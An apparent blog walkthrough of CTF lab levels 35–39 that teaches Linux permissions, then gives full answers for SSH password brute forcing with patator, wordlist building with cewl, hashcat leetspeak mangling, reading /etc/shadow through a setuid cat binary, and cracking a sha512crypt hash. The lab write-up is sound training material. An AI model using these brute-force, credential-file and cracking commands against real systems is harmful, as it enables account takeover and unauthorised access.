---
layout: post
title:  "Part 6 - The Hax that Rocks the Cradle Brute Force"
date:   2022-08-26 17:19:23 -0500
categories: thehaxthatrocksthecradle
---

<br>
# Level 35 - This One's Not About Brute Force!
Ok, so the rest of these levels will involve brute forcing, but this one doesn't. I just didn't want to have a whole separate page for this one. \\(o_O)/
<br>Sekhmet, in all her anger about Mafdet, also found some other account info!

<details>
<summary>Level 35 - Hint</summary>

<br>
<span style="color:DodgerBlue">
Find out how to make a file executable in Linux.
</span>
</details>
<br>
<details>
<summary>Level 35 - Full Answer</summary>

<br>
<span style="color:MediumSeaGreen">
Linux doesn't let you run/execute a program unless the file specifically has the permissions set up to do so. Check the permissions with <code>ls -la</code>:
<pre>
sekhmet@thehaxthatrocksthecradle:~$ ls -la runthisthing 
-rw-rw-r-- 1 sekhmet sekhmet 16744 Apr  2  2021 runthisthing
</pre>
<br>
The file permissions are all those letters/symbols at the beginning of the second line, to the left of the number 1. But how do you read all that mess? To fully understand it would require a long explanation, so let's just go with the basics for now and explain it all with some handy color-coding.<br>
<br>
<code>
<span style="color:purple" >-</span>
<span style="color:DarkOrange" >rw-</span>
<span style="color:DarkSlateBlue" >rw-</span>
<span style="color:DeepPink" >r--</span>
 1 
 <span style="color:DarkOrange" >sekhmet </span>
<span style="color:DarkSlateBlue" > sekhmet </span>
 16744 Apr  2  2021 runthisthing</code><br>
<br>
<span style="color:purple" ><code>-</code> - This will typically just be a <code>-</code> if it's a file or a letter <code>d</code> if it's a directory. Ours is a file, we don't need anything else from it here.</span><br>
<span style="color:DarkOrange" ><code>rw-</code> - This indicates that the owner of the file can read it and write to it. A letter means the permission is present, a dash means that permission is not present. The owner in this case is our buddy Sekhmet (the first <code>sekhmet</code> is the owner)</span> <br>
<span style="color:DarkSlateBlue" ><code>rw-</code> - Same thing here, but this is for the owning group. The second <code>sekhmet</code> is the owning group. We can see that the sekhmet group can also read and write to the file</span><br>
<span style="color:DeepPink" ><code>r--</code> - These are the permissions for everyone else. Everyone can read the file, but they can't write to it.</span><br>
<br>
So now what? Well, we want to add <b>execution</b> permissions to the file, which would be represented by an <code>x</code> instead of the <code>-</code> in the third column for each permission set. The easiest way to do that would be:<br>
<code>chmod +x runthisthing</code><br>
<br>
This adds the <code>x</code> to all the permissions for this file. Note that this means everyone can execute this file now! You can get more granular, but we're just going for quick and easy right now.<br>
<br>
Check the permissions after running that and they should be:<br>
<pre>
sekhmet@thehaxthatrocksthecradle:~$ ls -la runthisthing 
-rwxrwxr-x 1 sekhmet sekhmet 16744 Apr  2  2021 runthisthing
</pre>
<br>
Ok, so now you can allegedly execute this file. Right. Let's do that now.<br>
How?<br>
<br>
To run an executable file in the directory you're currently in at the CLI:<br>
<pre>./runthisthing
                                                 >=>                    
                                                 >=>                    
  >==>    >=>   >=>   >==>       >==> >=>  >=> >=>>==> >=>  >=>  >===>  
>>   >=>    >> >=>  >>   >=>   >=>    >=>  >=>   >=>   >=>  >=> >=>     
>>===>>=>    >>     >>===>>=> >=>     >=>  >=>   >=>   >=>  >=>   >==>  
>>         >>  >=>  >>         >=>    >=>  >=>   >=>   >=>  >=>     >=> 
 >====>   >=>   >=>  >====>      >==>   >==>=>    >=>    >==>=> >=> >=> 
                                         
You have executed the program as required
Decode for the password:
ZXhlY3V0aXZlT3JkZXJz
</pre><br>
These people and their encoding!! (╯°□°）╯︵ ┻━┻)<br>
Decode as usual from base64:<br>
<pre>
└─$ hURL -b ZXhlY3V0aXZlT3JkZXJz           

Original string       :: ZXhlY3V0aXZlT3JkZXJz
base64 DEcoded string :: executiveOrders
</pre>

<i>There's a lot more to permissions that I didn't cover - you can certainly find more info online, such as here: <a href="https://linuxhandbook.com/linux-file-permissions/">https://linuxhandbook.com/linux-file-permissions/</a></i>
</span>
</details>
<br>
# Level 36 - This One is About Brute Force! What Does That Mean Anyway?
Let's get into some password attacks!
A short/quick definition of brute forcing an account would be going through a bunch of guesses for the password for the account. There are a few different types. 

A true brute force, or key space brute force is the most ... brutish of them all. For example - we did just that in the earlier examples. Our key space was just 26 letters at first (26 guesses), then 2 digit numbers (100 guesses), then 4 digit numbers. That last one took us up to 10,000 possible guesses (0000-9999). What if we add lowercase letters to that mix?
We'd be up to 1,679,616 guesses. You can see how this starts to get impractical pretty quickly. Enter the dictionary attack!

A dictionary attack uses a list of likely passwords. Where does that list come from? Could be any of a variety of places:
* a breach of a company's database
* a compilation of words from a website the victim frequents
* a list of commonly used passwords
* a list you sat there typing up by hand because ... you were working on your typing skills, maybe?

This type of attack relies on someone using something in your list as their password, so the art of getting a list together is another subject that could make for a book by itself. We will instead take advantage of someone else's work and use a pre-existing list.

<details>
<summary>Level 36 - Hint</summary>

<br>
<span style="color:DodgerBlue">
Your steps for this level:
<ul>
<li>Download the password list</li>
<li>Find a way to perform a brute force password attack against SSH - hint for the hint, look up how to do it with Patator. Hint for that - honestly, just check out patator's awesome help menu from the command line!</li>
<li>Perform the SSH password attack</li>
</ul>
</span>
</details>
<br>
<details>
<summary>Level 36 - Full Answer</summary>

<br>
<span style="color:MediumSeaGreen">
Your steps for this level:
<ul>
<li>Download the password list</li>
<ul>
<li><code>wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-15.txt</code><br>
This is a cut down version of a very well known password list. This GitHub repository has a ton of lists for trying to discover/crack all sorts of stuff including usernames, passwords, directories, and more!</li>
</ul>
<li>Find a way to perform a password attack against SSH</li>
<ul>
<li>I'll be using Patator in this case, but there are other applications you could use instead.</li>
<li>If you checked out the tool's help (like I said you should!!) you might have seen something like:
<pre>
└─$ patator --help          
Patator 0.9 (https://github.com/lanjelot/patator) with python-3.10.7
Usage: patator module --help

Available modules:
  + ftp_login     : Brute-force FTP
  + ssh_login     : Brute-force SSH
  + telnet_login  : Brute-force Telnet
... etc
</pre>
Then check out the module specific help:
<pre>
└─$ patator ssh_login --help
Patator 0.9 (https://github.com/lanjelot/patator) with python-3.10.7
Usage: ssh_login <module-options ...> [global-options ...]

Examples:
  ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'

Module options:
  host          : target host
  port          : target port [22]
  user          : usernames to test
  password      : passwords to test
  auth_type     : type of password authentication to use [password|keyboard-interactive|auto]
  keyfile       : file with RSA, DSA or ECDSA private key to test
  persistent    : use persistent connections [1|0] 
</pre>
From the example given and the option descriptions, we can start filling in our environment's info as seen in the next step.
</li>
</ul>
<li>Perform the SSH password attack</li>
<ul>
<li><pre>
└─$ patator ssh_login host=10.0.0.19 user=brutus password=FILE0 0=rockyou-15.txt
21:14:26 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.10.7 at 2022-09-29 21:14 CDT
21:14:26 patator    INFO -                                                                              
21:14:26 patator    INFO - code  size    time | candidate                          |   num | mesg
21:14:26 patator    INFO - -----------------------------------------------------------------------------
21:14:29 patator    INFO - 1     22     3.506 | 123456                             |     1 | Authentication failed.
21:14:29 patator    INFO - 1     22     3.497 | 12345                              |     2 | Authentication failed.
21:14:29 patator    INFO - 1     22     3.506 | 123456789                          |     3 | Authentication failed.
21:14:29 patator    INFO - 1     22     3.502 | iloveyou                           |     5 | Authentication failed.
21:14:30 patator    INFO - 1     22     3.524 | password                           |     4 | Authentication failed.
21:14:30 patator    INFO - 1     22     3.508 | princess                           |     6 | Authentication failed.
21:14:30 patator    INFO - 1     22     3.501 | 1234567                            |     7 | Authentication failed.
21:14:30 patator    INFO - 1     22     3.505 | 12345678                           |     8 | Authentication failed.
21:14:30 patator    INFO - 1     22     3.501 | abc123                             |     9 | Authentication failed.
21:14:30 patator    INFO - 1     22     3.501 | nicole                             |    10 | Authentication failed.
21:14:33 patator    INFO - 1     22     3.496 | daniel                             |    11 | Authentication failed.
</pre>
</li>
<li>I left off the <code>-x ignore:mesg="Authentication failed."</code> in this example just so you could see the process as it tries guessing all the different passwords. You can add that to the end of the command to make the output cleaner. Note that it will look like it's not doing anything for a while if you do that.</li>
<li>...or leave it as is and just scroll through the output a bit to find ...<br>
<pre>
...
21:19:16 patator    INFO - 1     22     3.500 | jessie                             |   215 | Authentication failed.
21:19:16 patator    INFO - 0     30     0.111 | hellokitty                         |   216 | SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
21:19:16 patator    INFO - 1     22     3.495 | jeremy                             |   207 | Authentication failed.
...
</pre>
</li>
<li>The successful login attempt will just show the SSH version on the server in this case.</li>
</ul>
</ul>
</span>
</details>
<br>
# Level 37 - Wordlists are Cool. Kool? Kewl?
Remember how we discussed the fact that wordlists could be pre-made or you could make one of your own?

<details>
<summary>Level 37 - Hint</summary>

<br>
<span style="color:DodgerBlue">
Your steps for this level:
<ul>
<li>Check the webpage in a browser if possible, just to see what you're working with</li>
<li>Check out <code>cewl</code> as Brutus suggested</li>
<li>Use <code>cewl</code> to generate a list of words 8 characters or longer from the target URL </li>
<li>Perform that SSH password attack like in the last level</li>
</ul>
</span>
</details>
<br>
<details>
<summary>Level 37 - Full Answer</summary>

<br>
<span style="color:MediumSeaGreen">
Your steps for this level:
<ul>
<li>Check the webpage in a browser if possible, just to see what you're working with</li>
<ul>
<li>Just go to the URL in your browser: http://INSERTIPADDRESSHERE:8000/sombra/playoverwatch.com/en-us/heroes/sombra/index.html</li>
</ul>
<li>Check out <code>cewl</code> online as Brutus suggested</li>
<ul>
<li>This will vary of course, I stumbled upon this guide <a href="https://www.geeksforgeeks.org/cewl-tool-creating-custom-wordlists-tool-in-kali-linux/">here.</a></li>
</ul>
<li>Use <code>cewl</code> to generate a list of words 8 characters or longer from the target URL:
<ul>
<li>
<pre>
└─$ cewl -m 8 http://TARGETIPADDRESS:8000/sombra/playoverwatch.com/en-us/heroes/sombra/index.html | tee sombralist.txt
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
Overwatch
Warcraft
BATTLETAG
Resurrected
Hearthstone
...
</pre>
<br>
<code>-m 8</code> - tells <code>cewl</code> to only include words of a minimum 8 characters or more<br>
<code> | tee sombralist.txt </code> - outputs the list to a file, in this case sombralist.txt, but also lets us see it on screen to make sure it looks about right<br>
</li>
</ul>
</li>
<li>Perform that SSH password attack like in the last level</li>
<ul>
<li>Use <code>patator</code> to brute force the SSH server again, just swap out the username and the file name you're using. Refer to level 36's full answer for that command.</li>
</ul>
</ul>
</span>
</details>
<br>
# Level 38 - Mangling
If your wordlist has the password you needed, that's great! What if someone uses a standard word, but kinda changes it a little bit to be all sneaky about things?

For example, what if, instead of:

`password`

The user whose password we're trying to crack uses:

`p@$$w0rd`

Hmm ... see if Sombra has some ideas for you.

<details>
<summary>Level 38 - Hint</summary>

<br>
<span style="color:DodgerBlue">
Your steps for this level:
<ul>
<li>Use <code>cewl</code> to generate a list of words 12 characters or longer from the target URL </li>
<li>Have a look at hashcat mangling rule files</li>
<li>Mangle your newly created wordlist</li>
<li>Perform that SSH password attack like in the last level</li>
</ul>
</span>
</details>
<br>
<details>
<summary>Level 38 - Full Answer</summary>

<br>
<span style="color:MediumSeaGreen">
Your steps for this level:
<ul>
<li>Use <code>cewl</code> to generate a list of words 12 characters or longer from the target URL </li>
<ul>
<li>
<pre>
└─$ cewl -m 12 http://TARGETIPADDRESS:8000/sombra/playoverwatch.com/en-us/heroes/sombra/index.html | tee sombralist2.txt
</pre>
</li>
</ul>
<li>Have a look at hashcat mangling rule files</li>
<ul>
<li>
<pre>
└─$ ls -la /usr/share/hashcat/rules 
total 2588
...
-rw-r--r-- 1 root root    298 Dec 23  2021 leetspeak.rule
...
</pre>
That one looks like it might be good!
</li>
</ul>
<li>Mangle your newly created wordlist</li>
<ul>
<li><code>hashcat --stdout --rules-file /usr/share/hashcat/rules/leetspeak.rule sombralist2.txt > sombralist2_mangled.txt</code><br>
This command tells hashcat to use the leetspeak rule to "mangle" sombralist2.txt and output the results to sombralist2_mangled.txt (the original file remains intact). Have a look at the results to get an idea of what it did!<br>
For example, that last line, the word <code>Infiltration</code> was mangled to:
<pre>
Infiltr4tion  
Infiltr@tion  
Infiltration  
Infiltration  
Infiltration  
Infiltration  
Infiltration  
Inf1ltrat1on  
Inf!ltrat!on  
Infiltrati0n  
Infiltration  
Infiltration  
Infiltration  
Infil7ra7ion  
Infil+ra+ion  
Infiltration  
Inf1ltr@t10n
</pre>
</li>
</ul>
<li>Perform that SSH password attack like in the last level</li>
<ul>
<li>Use <code>patator</code> to brute force the SSH server again, just swap out the username and the file name you're using. Refer to level 36's full answer for that command.</li>
</ul>
</ul>
</span>
</details>
<br>
# Level 39 - Mangling
You're at the last challenge! This one may cover some new ground for you and take some time to get things figured out - that's ok!

<details>
<summary>Level 39 - Hint</summary>

<br>
<span style="color:DodgerBlue">
Your steps for this level:
<ul>
<li>Figure out which file contains password hashes in Linux and which part is the hash</li>
<li>Take a look at the <b>tools</b> directory and see if you spot anything different about the permissions of one file. If so, what does that mean?</li>
<li>Piece those two bits of info together and get the hash for <b>deanna</b></li>
<li>Download the password list sombra told you about</li>
<li>Use hashcat, the hash, and the password list to crack the hash</li>
</ul>
</span>
</details>
<br>
<details>
<summary>Level 39 - Full Answer</summary>

<br>
<span style="color:MediumSeaGreen">
Your steps for this level:
<ul>
<li>Figure out which file contains password hashes in Linux and which part is the hash</li>
<ul>
<li>Some online searching should get you what you need here.<br>
Bing makes it (mostly) easy in this case:<br>
<image src="/images/shadowfile_bing.png"></image><br>
Note that the full file path is <code>/etc/shadow</code> - if you forget that first slash, you'll be looking for a folder called <code>etc</code> at your current location, which will likely not work, unless you happen to be at <code>/</code>.
</li>
<li>Ok, let's take a look at this file!<br>
<pre>
sombra2@thehaxthatrocksthecradle:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
</pre>
Hmm ... well, let's keep that file location handy and see if we can use that information later. You know ... by some odd coincidence.</li>
<li>How will you recognize the hash when you see it? You should be able to find that in some search results too, or something like the <a href="https://linux.die.net/man/5/shadow">man page for /etc/shadow</a>:<br>
<blockquote>
Each line of this file contains 9 fields, separated by colons (":"), in the following order:
**login name**
...
**encrypted password**
...
</blockquote>
Your hackery ears should perk up at the part that says <b>password</b>!! Ok, yes, it's encrypted. We'll get to how to handle that. In the meantime though, make a note that you're looking for the second field (as indicated by colons) on each line of that file. You know ... if you can ever open it.
</li>
</ul>
<li>Take a look at the <b>tools</b> directory and see if you spot anything different about the permissions of one file. If so, what does that mean?</li>
<ul>
<li>Let's take a look:<br>
<image src="/images/sombra2_tools.png"></image><br>
Do you see that red highlighting around the <code>cat</code> command? More importantly, do you see that the permissions for this one are:<br>
<code>-rwsr-xr-x</code><br>
instead of <br>
<code>-rwxr-xr-x</code><br>
<br>
What does that <b>s</b> mean?
</li>
<li>Search for something online, like <b>s in linux permissions</b> and you may come across something like <a href="https://unix.stackexchange.com/questions/118853/what-does-the-s-attribute-in-file-permissions-mean">this StackExchange answer:</a><br>
<blockquote>That is the "setuid" bit, which tells the OS to execute that program with the userid of its owner. This is typically used with files owned by root to allow normal users to execute them as root with no external tools (such as `sudo`).</blockquote>
<br>
And yes, I could point you to a more official source like the <a href="https://man7.org/linux/man-pages/man2/setuid.2.html">Linux man pages</a>, but honestly, I find that their explanation might be a little confusing for someone new to all of this:<br>
<blockquote>       **setuid**() sets the effective user ID of the calling process.  If
       the calling process is privileged (more precisely: if the process
       has the **CAP_SETUID** capability in its user namespace), the real
       UID and saved set-user-ID are also set.</blockquote>
<br>
<a href="https://en.wikipedia.org/wiki/Setuid#When_set_on_an_executable_file">Wikipedia</a>'s explanation is pretty understandable too:<br>
<blockquote>When the `setuid` or `setgid` attributes are set on an [executable](https://en.wikipedia.org/wiki/Executable "Executable") file, then any users able to execute the file will automatically execute the file with the privileges of the file's owner (commonly [root](https://en.wikipedia.org/wiki/Superuser "Superuser")) and/or the file's group, depending upon the flags set.</blockquote>
<br>
The reason I bring this up is that sometimes "official" sources are a little hard to understand and it might be worth shopping around online for an explanation to see who might explain it in a way that just clicks with you.
</li>
</ul>

<li>Piece those two bits of info together and get the hash for <b>deanna</b></li>
<ul>
<li>Ok, so now you know which file contains hashes, but you don't have permissions to access it.</li>
<li>You also have an executable file that gives you permissions higher than your own - specifically <b>root</b>! That file just so happens to show the contents of a file.</li>
<li>Put that together and you can use that specific binary/executable file to show the contents of the file that contains the hashes! Like so:<br>
<pre>
sombra2@thehaxthatrocksthecradle:~/tools$ ./cat /etc/shadow
... [snipped for length here] ...
deanna:$6$.2ByfvQVAKkYcMeG$ko7jAgly/HdcYX7q5n7Eviok0HetHS2ltJgNQUTrJeuVBVEY7hmmMn3b9N.5OjcqO0wBb5uRfA6HgDh4edbU5.:19216:0:99999:7:::
</pre>
We got it! You will also see the hashes for all the other accounts on the system as well. For now, let's just go with the <b>deanna</b> line since at this point you should have the password for the other accounts anyway.<br>
Remember that the hash is just the second field in that line, so it's this part here:<br>
<code>
deanna:<span style="color:purple" >$6$.2ByfvQVAKkYcMeG$ko7jAgly/HdcYX7q5n7Eviok0HetHS2ltJgNQUTrJeuVBVEY7hmmMn3b9N.5OjcqO0wBb5uRfA6HgDh4edbU5.</span>:19216:0:99999:7:::
</code><br>
So the hash is just:<br>
<code>$6$.2ByfvQVAKkYcMeG$ko7jAgly/HdcYX7q5n7Eviok0HetHS2ltJgNQUTrJeuVBVEY7hmmMn3b9N.5OjcqO0wBb5uRfA6HgDh4edbU5.
</code><br>
Save that hash to a file on your system however you want in a place you can find it easily later.
</li>
</ul>

<li>Download the password list sombra told you about</li>
<ul>
<li>Remember your friend <code>wget</code>!<br>
<pre>wget 10.0.0.19:8000/sombra_super_password_list.txt
--2022-10-12 20:53:38--  http://10.0.0.19:8000/sombra_super_password_list.txt
Connecting to 10.0.0.19:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 478948 (468K) [text/plain]
Saving to: ‘sombra_super_password_list.txt’

sombra_super_password_list.txt                       100%[===================================================================================================================>] 467.72K  --.-KB/s    in 0.004s  

2022-10-12 20:53:38 (117 MB/s) - ‘sombra_super_password_list.txt’ saved [478948/478948]
</pre>
</li>
</ul>

<li>Use <code>hashcat</code>, the hash, and the password list to crack the hash</li>
<ul>
<li>Again, looking for usage examples online will be helpful here.<br>
<a href="https://linuxhint.com/hashcat-tutorial/">This site</a> has some good examples. Note that <code>hashcat</code> has so many options, not all of the examples will be useful for us here and now. This one matches what we'll be doing though:<br>
<code>hashcat -m 0 -a 0 hashlist wordlist</code><br>
<br>
A bit more explanation might help though:<br>
<ul>
<li>
<code>-m 0</code> - tells <code>hashcat</code> the type of hash we're cracking. NOTE!!!! It's NOT 0 in this case! We need to find our hash type either in the <code>hashcat</code> help or on the site <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">here</a>. If you look at our hash, it starts with a <b>$6$</b>, so look for that character combo on the page and you should find that it's:<br>
<code>1800    |    sha512crypt $6$, SHA512 (Unix)</code><br>
</li>

<li>
<code>-a 0</code> - tells <code>hashcat</code> we're doing a <b>dictionary attack</b>, so all password attempts will come directly from the list, as opposed to <code>hashcat</code> mangling passwords like in our past usage.
</li>

<li>
<code>hashlist</code> - this will be replaced by the name of the file containing your hashes, or in our case, one hash.
</li>

<li>
<code>wordlist</code> - this will be replaced by the name of the file containing your passwords.
</li>

</ul>
</li>

<li>Given all the above, our final command would be something like:<br>
<code>hashcat -m 1800 -a 0 deannahash sombra_super_password_list.txt</code><br>
<code>hashcat</code> outputs a lot of info, but look for something like this:<br>
<pre>
$6$.2ByfvQVAKkYcMeG$ko7jAgly/HdcYX7q5n7Eviok0HetHS2ltJgNQUTrJeuVBVEY7hmmMn3b9N.5OjcqO0wBb5uRfA6HgDh4edbU5.:<span style="color:purple" >knitpurl724</span>
                                                          
Session..........: hashcat
Status...........: Cracked
</pre>
(color coding done by me, not hashcat).
That line that shows the hash:somethingelse? That <b>somethingelse</b> is your cracked password!<br>
<br>

Did you get something like this when you tried to run <code>hashcat</code>?:<br>
<code><span style="color:red" >* Device #1: Not enough allocatable device memory for this attack.</span></code><br>
As of October 2022, the default amount of RAM that the Kali VMware image it set to use is 2GB, which <code>hashcat</code>, in true feline style, decides is just not good enough. If you can, turn that up to 4GB and <code>hashcat</code> should be ok with that.
</li>

</ul>
</ul>
</span>
</details>
<br>